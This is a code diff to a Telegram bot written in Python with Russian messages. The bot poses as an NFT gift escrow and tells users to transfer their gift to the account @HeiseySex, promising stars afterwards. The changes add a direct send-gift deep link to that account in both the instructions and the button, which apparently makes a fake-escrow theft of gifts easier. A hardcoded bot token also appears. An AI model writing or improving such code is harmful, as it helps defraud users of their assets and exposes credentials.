@@ -18,6 +18,9 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "8204031823:AAHA7mUlrZGVcMlF8whWAqYakjvd
 
 OWNER_ID = 861423393
 
+# Ссылка для прямой отправки подарка
+GIFT_URL = "tg://send_gift?to=heiseysex"
+# Обычная ссылка на профиль (для запасного варианта)
 TARGET_URL = "https://t.me/HeiseySex"
 
 VERIFY_TIMEOUT_SECONDS = 300  # 5 минут
@@ -40,7 +43,7 @@ def normalize_url(raw):
     
     if raw.startswith("@"):
         return f"https://t.me/{raw[1:]}"
-    if raw.startswith(("http://", "https://")):
+    if raw.startswith(("http://", "https://", "tg://")):
         return raw
     if raw.startswith(("t.me/", "telegram.me/")):
         return f"https://{raw}"
@@ -138,7 +141,7 @@ def build_escrow_message(name, url, amount):
         "звёзд сразу после передачи подарка.\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "<b>Инструкция для завершения сделки:</b>\n\n"
-        f"1. Передайте подарок пользователю: <b>@HeiseySex</b>\n"
+        f"1. Передайте подарок пользователю: <a href=\"{GIFT_URL}\"><b>@HeiseySex</b></a>\n"
         f"2. Нажмите «Передать NFT» и выберите "
         f"<a href=\"{url}\">{name}</a>\n"
         "3. Подтвердите передачу подарка.\n"
@@ -150,7 +153,7 @@ def build_escrow_message(name, url, amount):
 
 def build_escrow_keyboard():
     keyboard = InlineKeyboardMarkup()
-    keyboard.row(InlineKeyboardButton("🔗 Передать подарок", url=TARGET_URL))
+    keyboard.row(InlineKeyboardButton("🔗 Передать подарок", url=GIFT_URL))
     keyboard.row(
         InlineKeyboardButton("⚡ Подтвердить", callback_data="stage_verify"),
         InlineKeyboardButton("❌ Отменить", callback_data="stage_decline"),
